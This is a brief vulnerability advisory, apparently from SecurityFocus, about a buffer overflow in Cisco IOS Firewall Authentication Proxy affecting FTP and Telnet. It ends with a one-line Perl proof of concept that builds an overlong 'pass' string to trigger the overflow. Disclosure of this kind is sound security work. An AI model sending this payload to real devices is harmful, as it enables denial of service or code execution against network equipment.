source: https://www.securityfocus.com/bid/14770/info

Cisco IOS Firewall Authentication Proxy is prone to a buffer overflow condition. Successful exploitation of this issue could cause a denial of service or potential execution of arbitrary code.

This issue affects the FTP and Telnet protocols, but not HTTP. 

perl -e 'print "pass "; print "A" x 51; print "@ \n";'